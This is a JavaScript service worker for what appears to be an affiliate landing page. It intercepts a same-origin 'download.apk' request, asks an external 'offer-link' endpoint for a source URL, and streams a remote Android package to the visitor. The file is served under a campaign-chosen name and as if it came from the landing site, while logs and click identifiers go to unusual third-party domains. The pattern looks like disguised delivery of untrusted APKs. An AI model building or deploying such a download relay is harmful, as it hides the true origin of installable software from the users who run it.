importScripts('./params.js');

const ANALYT_LOGS_ENDPOINT = 'https://uiuirestorehere.art/i/v1/logs?token=phc_vqyXNzhYhfpZrwKKGMQ2VjQq2azSdh2StkeoHodd26NL';
const UPSTREAM_MAX_RETRIES = 2
const OFFER_LINK_ENDPOINT = 'https://iijjuiu.shop/landers/gitand/offer-link.php';

const logContext = {
  offer_id: 'undefined',
  click_id: 'undefined',
  file_name: 'undefined',
}

function pickClickId(params) {
  return params.get('click_id') || params.get('utm_id') || params.get('clickid') || params.get('clickId') || ''
}

function syncLogContext(params) {
  try {
    const p = params || new URLSearchParams(self.location.search)
    logContext.offer_id = p.get('offer_id') || 'undefined'
    logContext.click_id = pickClickId(p) || 'undefined'
    logContext.file_name = p.get('utm_medium') || 'undefined'
  } catch (error) {
    console.error('[sw] failed to read params', error)
  }
  return logContext
}

function contextAttributes() {
  return {
    offer_id: logContext.offer_id,
    click_id: logContext.click_id,
    file_name: logContext.file_name,
  }
}

function contextSuffix() {
  const parts = []
  if (logContext.offer_id !== 'undefined') parts.push(`offer_id: [${logContext.offer_id}]`)
  if (logContext.click_id !== 'undefined') parts.push(`click_id: [${logContext.click_id}]`)
  if (logContext.file_name !== 'undefined') parts.push(`file_name: [${logContext.file_name}]`)
  return parts.length ? ' ' + parts.join(', ') : ''
}

async function notifyPage(ctx, payload) {
  try {
    const message = {
      ...payload,
      offer_id: logContext.offer_id,
      click_id: logContext.click_id,
      file_name: logContext.file_name,
    }

    // Download navigation requests often arrive with an empty clientId, so the
    // exact client cannot be addressed. Fall back to broadcasting to all page
    // clients; every landing filters messages by download_id.
    const clientId = ctx && ctx.clientId
    if (clientId) {
      let client = null
      try {
        client = await self.clients.get(clientId)
      } catch (error) {
        console.error('[sw] clients.get failed', error)
      }
      if (client) {
        client.postMessage(message)
        return
      }
      sendLog(`Notify page: client not found, broadcasting [${payload && payload.type}]`, { level: 'warn', attributes: { download_id: (ctx && ctx.downloadId) || 'undefined' } })
    }

    let clients = []
    try {
      clients = await self.clients.matchAll({ type: 'window', includeUncontrolled: true })
    } catch (error) {
      console.error('[sw] clients.matchAll failed', error)
    }

    let delivered = 0
    for (const client of clients) {
      try {
        client.postMessage(message)
        delivered += 1
      } catch (error) {
        console.error('[sw] client.postMessage failed', error)
      }
    }

    if (delivered === 0) {
      sendLog(`Cannot notify page: no clients [${payload && payload.type}]`, { level: 'error', attributes: { download_id: (ctx && ctx.downloadId) || 'undefined' } })
    } else {
      sendLog(`Notified page clients [${payload && payload.type}]`, { attributes: { download_id: (ctx && ctx.downloadId) || 'undefined', clients: delivered } })
    }
  } catch (error) {
    console.error('[sw] notify page failed', error)
  }
}

async function notifyDownloadCanceled(state, reason, ctx) {
  try {
    const attrs = {
      bytes: state ? state.bytes : 0,
      content_length: state ? state.contentLength : null,
      reason: reason === undefined ? 'undefined' : String(reason),
      download_id: (ctx && ctx.downloadId) || 'undefined',
      stream: (ctx && ctx.stream) || 'unknown',
    }
    sendLog('Download canceled by client', { level: 'warn', attributes: attrs })

    const clientId = ctx && ctx.clientId
    if (!clientId) {
      sendLog('Download canceled without clientId, cannot notify page', { level: 'error', attributes: attrs })
      return
    }

    let client = null
    try {
      client = await self.clients.get(clientId)
    } catch (error) {
      console.error('[sw] clients.get failed', error)
    }
    if (!client) {
      sendLog('Download canceled client not found, cannot notify page', { level: 'error', attributes: attrs })
      return
    }

    client.postMessage({
      type: 'DOWNLOAD_CANCELED',
      offer_id: logContext.offer_id,
      click_id: logContext.click_id,
      file_name: logContext.file_name,
      ...attrs,
    })
  } catch (error) {
    console.error('[sw] cancel notify failed', error)
  }
}

function errorAttributes(error, extra = {}) {
  const out = { ...extra }
  if (error && typeof error === 'object') {
    out.error_name = error.name || 'undefined'
    out.error_message = error.message || 'undefined'
    out.error_stack = error.stack ? String(error.stack).slice(0, 2000) : 'undefined'
    if (error.cause !== undefined) {
      out.error_cause = (error.cause && error.cause.message)
        ? `${error.cause.name || 'Error'}: ${error.cause.message}`
        : String(error.cause)
    }
  } else if (error !== undefined) {
    out.error_name = 'undefined'
    out.error_message = String(error)
    out.error_stack = 'undefined'
  }
  return out
}

async function timed(label, promise, extra = {}) {
  const startedAt = performance.now()
  sendLog(`Await ${label}`, { attributes: extra })
  try {
    const value = await promise
    sendLog(`Awaited ${label}`, { attributes: { ...extra, await_duration_ms: Math.round(performance.now() - startedAt) } })
    return value
  } catch (error) {
    sendLog(`Step failed: ${label}`, { level: 'error', attributes: errorAttributes(error, { ...extra, await_duration_ms: Math.round(performance.now() - startedAt) }) })
    throw error
  }
}

function sendLog(message, options = {}, event = null) {
  const now = (BigInt(Date.now()) * 1000000n).toString();

  const severity = {
    trace: [1, 'TRACE'],
    debug: [5, 'DEBUG'],
    info: [9, 'INFO'],
    warn: [13, 'WARN'],
    error: [17, 'ERROR'],
    fatal: [21, 'FATAL'],
  };

  const [severityNumber, severityText] =
    severity[options.level || 'info'] || severity.info;

  function toOtelValue(value) {
    if (typeof value === 'boolean') return { boolValue: value };
    if (typeof value === 'number') {
      return Number.isInteger(value)
        ? { intValue: String(value) }
        : { doubleValue: value };
    }
    if (value === null || value === undefined) {
      return { stringValue: '' };
    }
    if (typeof value === 'object') {
      return { stringValue: JSON.stringify(value) };
    }
    return { stringValue: String(value) };
  }

  const domain = self.location.hostname;

  const payload = {
    resourceLogs: [{
      resource: {
        attributes: [
          { key: 'service.name', value: { stringValue: 'sw4.js' } },
          { key: 'service.version', value: { stringValue: '4' } },
          { key: 'domain', value: { stringValue: domain } },
        ],
      },
      scopeLogs: [{
        scope: {
          name: 'service-worker',
          version: '1.0.0',
        },
        logRecords: [{
          timeUnixNano: now,
          observedTimeUnixNano: now,
          severityNumber,
          severityText,
          body: {
            stringValue: `${message}${contextSuffix()}`,
          },
          attributes: [
            ...Object.entries({ ...contextAttributes(), ...(options.attributes || {}) })
              .filter(([key]) => key !== 'domain')
              .map(([key, value]) => ({
                key,
                value: toOtelValue(value),
              })),
            {
              key: 'domain',
              value: { stringValue: domain },
            },
          ],
        }],
      }],
    }],
  };

const callerStack = new Error().stack; // Стектрейс: откуда именно вызвали sendLog
const startedAt = performance.now();

  const request = fetch(ANALYT_LOGS_ENDPOINT, {
    method: 'POST',
    mode: 'cors',
    credentials: 'omit',
    headers: {
      'Content-Type': 'text/plain;charset=UTF-8',
    },
    body: JSON.stringify(payload),
  }).then(async (response) => {
    const durationMs = Math.round(performance.now() - startedAt);
    const responseText = await response.text().catch((e) => `<read error: ${e.message}>`);

    if (!response.ok) {
      console.error('[Analyt] HTTP Error:', {
        status: response.status,
        statusText: response.statusText,
        url: response.url,
        redirected: response.redirected,
        type: response.type,
        durationMs,
        headers: Object.fromEntries(response.headers.entries()),
        responseBody: responseText,
        requestPayload: payload,
        callerStack,
      });
    } else {
      console.debug('[Analyt] Delivered:', {
        status: response.status,
        durationMs,
        responseBody: responseText,
      });
    }
  }).catch((error) => {
    const durationMs = Math.round(performance.now() - startedAt);

    console.error('[Analyt] Network / Fetch Failure:', {
      name: error?.name,
      message: error?.message,
      stack: error?.stack,
      cause: error?.cause, // В новых браузерах тут часто лежит сетевая причина (ERR_CONNECTION_REFUSED, CERT и т.д.)
      rawError: Object.getOwnPropertyNames(error || {}).reduce((acc, key) => {
        acc[key] = error[key];
        return acc;
      }, {}),
      endpoint: ANALYT_LOGS_ENDPOINT,
      durationMs,
      online: self.navigator?.onLine,
      requestPayload: payload,
      callerStack,
    });
  });

  // Продлеваем жизнь Service Worker, если передан ExtendableEvent.
  if (event && typeof event.waitUntil === 'function') {
    event.waitUntil(request);
  }
}

self.addEventListener('install', () => {
  self.skipWaiting();
});

self.addEventListener('activate', (event) => {
  event.waitUntil(self.clients.claim());
});

self.addEventListener('message', (event) => {
  sendLog('Message event')
  if (event.data && event.data.type === 'SKIP_WAITING') {
    sendLog('Skip waiting (message event)')
    self.skipWaiting();
  }
});

let apkPromise = null;
let apkError = null;
let apkRequestKey = null;
let apkState = null;

function delay(ms) {
  return new Promise((resolve) => {
    setTimeout(resolve, ms);
  });
}

function getTimestampWithMs() {
  const d = new Date();
  const pad = (n, len = 2) => String(n).padStart(len, '0');

  const yyyy = d.getFullYear();
  const mm   = pad(d.getMonth() + 1);
  const dd   = pad(d.getDate());
  const hh   = pad(d.getHours());
  const mi   = pad(d.getMinutes());
  const ss   = pad(d.getSeconds());
  const ms   = pad(d.getMilliseconds(), 3); // 0..999 -> "007", "123"

  return `${yyyy}-${mm}-${dd}_${hh}-${mi}-${ss}.${ms}`;
}

function sanitizeFileName(value) {
  const fallbackBase = 'download9918';

  const candidate = String(value || '')
        .replace(/\.apk$/i, '')
        .slice(0, 80);
  const isValid = candidate !== ''
        && !/^[ _-]+$/.test(candidate)
        && !/^ /.test(candidate)
        && /^[a-zA-Z0-9_*(). -]+$/.test(candidate);
  const base = isValid ? candidate : fallbackBase;

  const timestamp = getTimestampWithMs()

  return `${base}.${timestamp}.apk`;
}

function dlFail(message, reason, upstreamStatus) {
  const error = new Error(message)
  error.dl_reason = reason
  if (upstreamStatus !== undefined && upstreamStatus !== null) {
    error.dl_upstream_status = upstreamStatus
  }
  return error
}

function upstreamReason(status) {
  return status >= 500 ? 'upstream_5xx' : 'upstream_4xx'
}

function buildErrorResponse(message, status = 502, servedId, error, reason, upstreamStatus) {
  sendLog(`Error response: ${message}, status: ${status}`, { level: 'error', attributes: {
    served_id: servedId || 'undefined',
    download_id: servedId || 'undefined',
    fail_reason: reason || 'undefined',
    upstream_status_code: (upstreamStatus === undefined || upstreamStatus === null) ? 'undefined' : upstreamStatus,
    ...errorAttributes(error),
  } })

  const headers = {
    'Content-Type': 'text/plain; charset=utf-8',
    'Cache-Control': 'no-store',
  }
  if (servedId) {
    headers['X-DL-Served'] = servedId
  }
  if (reason) {
    headers['X-DL-Fail'] = reason
  }
  if (upstreamStatus !== undefined && upstreamStatus !== null) {
    headers['X-DL-Fail-Status'] = String(upstreamStatus)
  }

  return new Response(message, {
    status,
    headers,
  });
}

function isUsableContentLength(value) {
  const length = Number(value);
  return Number.isSafeInteger(length) && length > 0;
}

function resetApkState() {
  apkPromise = null;
  apkError = null;
  apkRequestKey = null;
  apkState = null;
}

function notifySubscribers(state, method, value) {
  state.subscribers.forEach((subscriber) => {
    try {
      subscriber[method](value);
    } catch (error) {
      console.error('[download] subscriber notification failed', error);
    }
  });
}

// Read an upstream APK response into state, skipping bytes we already have
// (the source CDN ignores Range, so a retry re-fetches from the start).
async function readUpstreamIntoState(state, response) {
  const reader = response.body.getReader()
  let skip = state.bytes
  while (true) {
    const { done, value } = await reader.read()
    if (done) return
    let chunk = value
    if (skip > 0) {
      if (chunk.byteLength <= skip) {
        skip -= chunk.byteLength
        continue
      }
      chunk = (typeof chunk.subarray === 'function') ? chunk.subarray(skip) : chunk.slice(skip)
      skip = 0
    }
    state.chunks.push(chunk)
    state.bytes += chunk.byteLength
    state.chunkCount += 1
    notifySubscribers(state, 'enqueue', chunk)
  }
}

async function pumpApkBody(state, response) {
  const startedAt = performance.now()
  let current = response
  let attempt = 0
  let needFetch = false

  while (true) {
    try {
      if (needFetch) {
        current = await timed(`fetch source apk retry ${attempt}`, fetch(state.href, {
          method: 'GET',
          mode: 'cors',
          credentials: 'include',
          redirect: 'follow',
        }), { download_id: (state.ctx && state.ctx.downloadId) || 'undefined' })
        if (!current.ok) {
          throw dlFail(`retry HTTP ${current.status}`, upstreamReason(current.status), current.status)
        }
      }

      await readUpstreamIntoState(state, current)

      state.done = true
      sendLog('Upstream apk stream completed', { attributes: {
        download_id: (state.ctx && state.ctx.downloadId) || 'undefined',
        source_url: state.href || 'undefined',
        bytes: state.bytes,
        chunk_count: state.chunkCount,
        content_length: state.contentLength === null ? 'undefined' : state.contentLength,
        retries: attempt,
        duration_ms: Math.round(performance.now() - startedAt),
      } })
      await notifyPage(state.ctx, {
        type: 'DOWNLOAD_DONE',
        bytes: state.bytes,
        content_length: state.contentLength === null ? 'undefined' : state.contentLength,
        retries: attempt,
        download_id: (state.ctx && state.ctx.downloadId) || 'undefined',
      })
      notifySubscribers(state, 'close')
      state.subscribers.clear()
      return
    } catch (error) {
      state.streamFailures = (state.streamFailures || 0) + 1
      const contentLength = Number(state.contentLength)
      const attrs = errorAttributes(error, {
        download_id: (state.ctx && state.ctx.downloadId) || 'undefined',
        source_url: state.href || 'undefined',
        bytes: state.bytes,
        chunk_count: state.chunkCount,
        content_length: state.contentLength === null ? 'undefined' : state.contentLength,
        percent: (isUsableContentLength(state.contentLength) && contentLength > 0)
          ? Math.round((state.bytes / contentLength) * 100)
          : 'undefined',
        retries: attempt,
        stream_failures: state.streamFailures,
        duration_ms: Math.round(performance.now() - startedAt),
      })

      if (attempt < UPSTREAM_MAX_RETRIES && state.href) {
        attempt += 1
        needFetch = true
        sendLog('Upstream apk stream failed, retrying', { level: 'warn', attributes: attrs })
        continue
      }

      // Partial bytes received => the upstream transfer dropped mid-stream
      // (CDN/connection), not a failure to establish the request.
      const finalReason = state.bytes > 0 ? 'cdn_stream_break' : 'network'
      error.dl_reason = error.dl_reason || finalReason
      state.error = error
      apkError = error
      sendLog('Upstream apk stream failed', { level: 'error', attributes: { ...attrs, fail_reason: finalReason } })
      await notifyPage(state.ctx, {
        type: 'DOWNLOAD_FAILED',
        reason: error.dl_reason || finalReason,
        upstream_status_code: (error.dl_upstream_status === undefined || error.dl_upstream_status === null) ? 'undefined' : error.dl_upstream_status,
        bytes: state.bytes,
        chunk_count: state.chunkCount,
        content_length: state.contentLength === null ? 'undefined' : state.contentLength,
        percent: (isUsableContentLength(state.contentLength) && Number(state.contentLength) > 0)
          ? Math.round((state.bytes / Number(state.contentLength)) * 100)
          : 'undefined',
        stream_failures: state.streamFailures,
        retries: attempt,
        error_name: (error && error.name) || 'undefined',
        error_message: (error && error.message) || 'undefined',
        download_id: (state.ctx && state.ctx.downloadId) || 'undefined',
      })
      notifySubscribers(state, 'error', error)
      state.subscribers.clear()
      throw error
    }
  }
}

function getTemplateValue(params, key) {
  const normalizedKey = key.toLowerCase();
  if (normalizedKey === 'clickid' || normalizedKey === 'click_id' || normalizedKey === 'utm_id') {
    return getClickId(params);
  }

  const value = params.get(key);
  if (value !== null) {
    return value;
  }

  if (key === 't2') {
    return params.get('utm_medium') || '';
  }

  if (key === 't3') {
    return params.get('utm_source') || '';
  }

  return '';
}

function getClickId(params) {
  return params.get('click_id') || params.get('utm_id') || params.get('clickid') || params.get('clickId') || '';
}

function fillOfferUrlTemplate(value, params) {
  return value.replace(/\{([A-Za-z0-9_-]+)\}/g, (match, key) => {
    return encodeURIComponent(getTemplateValue(params, key));
  });
}

async function resolveOfferUrl(offerId, params, ctx) {
  syncLogContext(params)
  const clickId = getClickId(params);
  const downloadId = (ctx && ctx.downloadId) || 'undefined';

  sendLog(`Resolve offer`, { attributes: { download_id: downloadId } })

  const endpoint = new URL(OFFER_LINK_ENDPOINT);
  endpoint.searchParams.set('offer_id', offerId);
  if (clickId) {
    endpoint.searchParams.set('click_id', clickId);
  }

  sendLog(`Fetch endpoint, get url: [${endpoint.href}]`, { attributes: { download_id: downloadId } })
  const response = await timed('fetch offer endpoint', fetch(endpoint.href, {
    method: 'GET',
    mode: 'cors',
    credentials: 'omit',
    redirect: 'follow',
    headers: {
      'Accept': 'application/json',
    },
  }), { download_id: downloadId })

  if (!response.ok) {
    sendLog(`Fetch endpoint failed, status ${response.status}`, { level: 'error', attributes: { download_id: downloadId, status_code: response.status, status_text: response.statusText || 'undefined', request_url: endpoint.href, response_url: response.url || 'undefined', response_type: response.type || 'undefined', fail_reason: upstreamReason(response.status) } })
    throw dlFail(`offer HTTP ${response.status}`, upstreamReason(response.status), response.status);
  }

  let data
  try {
    data = await timed('parse offer response', response.json(), { download_id: downloadId });
  } catch (parseError) {
    sendLog(`Offer response parse failed: ${parseError && parseError.message}`, { level: 'error', attributes: { download_id: downloadId, request_url: endpoint.href, fail_reason: 'offer_invalid' } })
    throw dlFail(`offer response parse failed: ${parseError && parseError.message}`, 'offer_invalid');
  }
  if (!data || typeof data.url !== 'string' || data.url.trim() === '') {
    sendLog(`Offer response url is missing, status ${response.status}`, { level: 'error', attributes: { download_id: downloadId, status_code: response.status, status_text: response.statusText || 'undefined', request_url: endpoint.href, response_url: response.url || 'undefined', fail_reason: 'offer_invalid' } })
    throw dlFail('offer response url is missing', 'offer_invalid');
  }

  const sourceUrl = new URL(fillOfferUrlTemplate(data.url, params));
  if (!['http:', 'https:'].includes(sourceUrl.protocol)) {
    throw dlFail('unsupported offer url protocol', 'offer_invalid');
  }

  if (clickId) {
    sourceUrl.searchParams.set('utm_id', clickId);
  }

  return sourceUrl;
}

function createApkState(offerId, params, requestKey, ctx) {
  syncLogContext(params)
  const downloadId = (ctx && ctx.downloadId) || 'undefined'
  sendLog(`Create APK state`, { attributes: { download_id: downloadId } })
  const state = {
    offerId,
    href: null,
    chunks: [],
    subscribers: new Set(),
    done: false,
    error: null,
    contentLength: null,
    contentDisposition: null,
    contentType: 'application/vnd.android.package-archive',
    bytes: 0,
    chunkCount: 0,
    streamFailures: 0,
  };

  state.ctx = ctx || null;
  apkState = state;
  apkRequestKey = requestKey;

  apkPromise = (async () => {
    const sourceUrl = await timed('resolve offer url', resolveOfferUrl(offerId, params, ctx), { download_id: downloadId });
    state.href = sourceUrl.href;

    syncLogContext(params)

    sendLog(`Fetch sourceUrl: [${sourceUrl.href}]`, { attributes: { download_id: downloadId } })

    const response = await timed('fetch source apk', fetch(sourceUrl.href, {
      method: 'GET',
      mode: 'cors',
      credentials: 'include',
      redirect: 'follow',
    }), { download_id: downloadId })

    if (!response.ok) {
      sendLog(`Source apk fetch failed, status ${response.status}`, { level: 'error', attributes: { download_id: downloadId, status_code: response.status, status_text: response.statusText || 'undefined', source_url: sourceUrl.href, response_url: response.url || 'undefined', response_type: response.type || 'undefined', fail_reason: upstreamReason(response.status) } })
      throw dlFail(`HTTP ${response.status}`, upstreamReason(response.status), response.status);
    }

    const contentLength = response.headers.get('content-length');
    if (isUsableContentLength(contentLength)) {
      state.contentLength = contentLength;
    }

    state.contentType = response.headers.get('content-type') || state.contentType;
    state.contentDisposition = response.headers.get('content-disposition');
    pumpApkBody(state, response).catch((error) => {
      console.error('[download] upstream body read failed', error);
    });

    return state;
  })().catch((error) => {
    state.error = error;
    apkError = error;
    notifySubscribers(state, 'error', error);
    state.subscribers.clear();
    throw error;
  });

  return state;
}

async function getApkState(offerId, params, requestKey, ctx) {
  syncLogContext(params)
  const downloadId = (ctx && ctx.downloadId) || 'undefined'

  if (apkRequestKey && apkRequestKey !== requestKey) {
    sendLog("Reset APK state", { attributes: { download_id: downloadId } })
    resetApkState();
  }

  if (apkError) {
    sendLog("APK error, reset APK state", { level: "error", attributes: { download_id: downloadId } })
    resetApkState();
  }

  if (!apkState) {
    createApkState(offerId, params, requestKey, ctx);
  }

  await timed('await apk promise', apkPromise, { download_id: downloadId });
  return apkState;
}

async function buildDeferredApkResponse(offerId, fileName, params, requestKey, ctx) {
  syncLogContext(params)
  const downloadId = (ctx && ctx.downloadId) || 'undefined'
  const state = await timed('get apk state', getApkState(offerId, params, requestKey, ctx), { download_id: downloadId });
  const headers = new Headers();
  headers.set('Content-Type', state.contentType);
  headers.set('Cache-Control', 'no-store');
  headers.set('X-DL-Served', (ctx && ctx.downloadId) || 'undefined');

  if (state.contentDisposition) {
    headers.set('Content-Disposition', state.contentDisposition);
  } else {
    headers.set('Content-Disposition', `attachment; filename="${fileName}"`);
  }

  if (state.contentLength) {
    headers.set('Content-Length', state.contentLength);
  }

  let subscriber = null;
  let canceled = false;

  const stream = new ReadableStream({
    async start(controller) {
      try {
        await timed('delay before streaming', delay(100), { download_id: downloadId });

        if (canceled) {
          sendLog('Stream canceled before first enqueue', { level: 'warn', attributes: { download_id: (ctx && ctx.downloadId) || 'undefined' } })
          return;
        }

        for (const chunk of state.chunks) {
          if (canceled) return;
          controller.enqueue(chunk);
        }

        if (state.error) {
          if (!canceled) controller.error(state.error);
          return;
        }

        if (state.done) {
          if (!canceled) controller.close();
          return;
        }

        subscriber = {
          enqueue: (chunk) => {
            if (!canceled) controller.enqueue(chunk);
          },
          close: () => {
            if (!canceled) controller.close();
          },
          error: (error) => {
            if (!canceled) controller.error(error);
          },
        };

        state.subscribers.add(subscriber);
      } catch (error) {
        if (!canceled) {
          sendLog(`buildDeferredResponse failed: ${error && error.message}`, { level: 'error', attributes: { download_id: downloadId, ...errorAttributes(error) } })
          try {
            controller.error(error);
          } catch (ignored) {
            // stream already closed by the client
          }
        }
      }
    },
    cancel(reason) {
      canceled = true;
      if (subscriber && state) {
        state.subscribers.delete(subscriber);
      }
      const stream = (ctx && ctx.stream) || 'unknown'
      const fullyDelivered = !!state && (
        state.done ||
        (isUsableContentLength(state.contentLength) && state.bytes >= Number(state.contentLength))
      )
      if (stream === 'tracker') {
        sendLog('Cancel from tracker stream ignored', { level: 'warn', attributes: { download_id: (ctx && ctx.downloadId) || 'undefined' } })
        return
      }
      if (fullyDelivered) {
        sendLog('Late cancel after full delivery ignored', { level: 'warn', attributes: { download_id: (ctx && ctx.downloadId) || 'undefined', bytes: state.bytes } })
        return
      }
      notifyDownloadCanceled(state, reason, ctx);
    },
  });

  return new Response(stream, {
    status: 200,
    statusText: 'OK',
    headers,
  });
}

self.addEventListener('fetch', (event) => {
  const requestUrl = new URL(event.request.url);

  const downloadUrl = new URL('./download.apk', self.location.href);
  if (requestUrl.origin !== downloadUrl.origin || requestUrl.pathname !== downloadUrl.pathname) {
    return;
  }

  const isTracker = event.request.headers.get('X-DL-Track') === '1'
  const downloadId = requestUrl.searchParams.get('download_id') || 'undefined'
  const ctx = {
    clientId: event.clientId || '',
    downloadId,
    stream: isTracker ? 'tracker' : 'iframe',
  }

  event.respondWith((async () => {
    try {
      const params = new URLSearchParams(await timed('read saved params', B1Params.read(), { download_id: downloadId }));
      params.set('download_id', downloadId)

      const offerId = params.get('offer_id');
      const clickId = getClickId(params)

      syncLogContext(params)

      if (!offerId || !offerId.trim()) {
        sendLog('Missing saved offer_id parameter', { level: 'error', attributes: { download_id: downloadId } })
        await notifyPage(ctx, { type: 'DOWNLOAD_FAILED', reason: 'bad_request', download_id: downloadId })
        return buildErrorResponse('Missing saved offer_id parameter', 400, downloadId, null, 'bad_request');
      }

      return await timed('build deferred apk response', buildDeferredApkResponse(
        offerId.trim().slice(0, 80),
        sanitizeFileName(params.get('utm_medium')),
        params,
        params.toString(),
        ctx
      ), { download_id: downloadId });
    } catch (error) {
      const reason = (error && error.dl_reason) || 'network'
      const upstreamStatus = error && error.dl_upstream_status
      sendLog(`APK download failed: ${error.message}`, { level: 'error', attributes: { download_id: downloadId, ...errorAttributes(error), fail_reason: reason, upstream_status_code: upstreamStatus === undefined ? 'undefined' : upstreamStatus } })
      await notifyPage(ctx, {
        type: 'DOWNLOAD_FAILED',
        reason,
        upstream_status_code: (upstreamStatus === undefined || upstreamStatus === null) ? 'undefined' : upstreamStatus,
        error_name: (error && error.name) || 'undefined',
        error_message: (error && error.message) || 'undefined',
        download_id: downloadId,
      })
      return buildErrorResponse(`APK download failed: ${error.message}`, 502, downloadId, error, reason, upstreamStatus);
    }
  })());
});
